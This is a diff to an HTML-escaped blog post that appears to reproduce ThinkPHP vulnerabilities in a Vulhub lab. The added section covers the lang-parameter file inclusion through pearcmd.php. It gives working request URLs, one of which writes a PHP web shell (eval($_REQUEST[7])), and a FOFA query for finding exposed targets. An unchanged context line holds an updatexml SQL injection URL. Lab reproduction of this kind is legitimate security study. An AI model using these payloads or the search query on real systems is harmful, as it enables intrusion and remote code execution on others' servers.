@@ -91,7 +91,30 @@
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
 &lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424235410605.png&#34; alt=&#34;image-20240424235410605&#34;&gt;&lt;/p&gt;
-&lt;h1 id=&#34;lang-rce&#34;&gt;&lt;a href=&#34;#lang-rce&#34; class=&#34;headerlink&#34; title=&#34;lang-rce&#34;&gt;&lt;/a&gt;lang-rce&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理：-4&#34;&gt;&lt;a href=&#34;#漏洞原理：-4&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理：&#34;&gt;&lt;/a&gt;漏洞原理：&lt;/h2&gt;&lt;p&gt;参考文章：&lt;/p&gt;
+&lt;h1 id=&#34;lang-rce&#34;&gt;&lt;a href=&#34;#lang-rce&#34; class=&#34;headerlink&#34; title=&#34;lang-rce&#34;&gt;&lt;/a&gt;lang-rce&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理：-4&#34;&gt;&lt;a href=&#34;#漏洞原理：-4&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理：&#34;&gt;&lt;/a&gt;漏洞原理：&lt;/h2&gt;&lt;p&gt;ThinkPHP是一个在中国使用较多的PHP框架。在其6.0.13版本及以前，存在一处本地文件包含漏洞。当多语言特性被开启时，攻击者可以使用lang参数来包含任意PHP文件。&lt;/p&gt;
+&lt;p&gt;虽然只能包含本地PHP文件，但在开启了register_argc_argv且安装了pcel&amp;#x2F;pear的环境下，可以包含&amp;#x2F;usr&amp;#x2F;local&amp;#x2F;lib&amp;#x2F;php&amp;#x2F;pearcmd.php并写入任意文件。&lt;/p&gt;
+&lt;p&gt;影响版本：&lt;/p&gt;
+&lt;p&gt;6.0.1 &amp;lt; ThinkPHP≤ 6.0.13&lt;/p&gt;
+&lt;p&gt;5.0.0 &amp;lt; ThinkPHP≤ 5.0.12&lt;/p&gt;
+&lt;p&gt;5.1.0 &amp;lt; ThinkPHP≤ 5.1.8&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;利用条件：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;1、需要Thinkphp开启多语言功能&lt;/p&gt;
+&lt;p&gt;2、安装pear扩展&lt;/p&gt;
+&lt;p&gt;3、知道pearcmd.php路径&lt;/p&gt;
+&lt;p&gt;4、register_argc_argv&amp;#x3D;on&lt;/p&gt;
+&lt;h2 id=&#34;漏洞复现：-4&#34;&gt;&lt;a href=&#34;#漏洞复现：-4&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现：&#34;&gt;&lt;/a&gt;漏洞复现：&lt;/h2&gt;&lt;p&gt;进行漏洞验证&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/index.php?+config-create+/&amp;amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;amp;/&amp;lt;?=phpinfo();?&amp;gt;+shell.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425091852033.png&#34; alt=&#34;image-20240425091852033&#34;&gt;&lt;/p&gt;
+&lt;p&gt;传入后门木马，进行连接&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/index.php?+config-create+/&amp;amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;amp;/&amp;lt;?=phpinfo();eval($_REQUEST[7]);?&amp;gt;+sqrt.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425091917700.png&#34; alt=&#34;image-20240425091917700&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;FOFA搜索语法：&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;header&amp;#x3D;”think_lang”&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;参考文章：&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/Yeoman92/article/details/53064670&#34;&gt;https://blog.csdn.net/Yeoman92/article/details/53064670&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/sectool/223149.html&#34;&gt;https://www.freebuf.com/sectool/223149.html&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/solitudi/article/details/113796433&#34;&gt;https://blog.csdn.net/solitudi/article/details/113796433&lt;/a&gt;&lt;/p&gt;
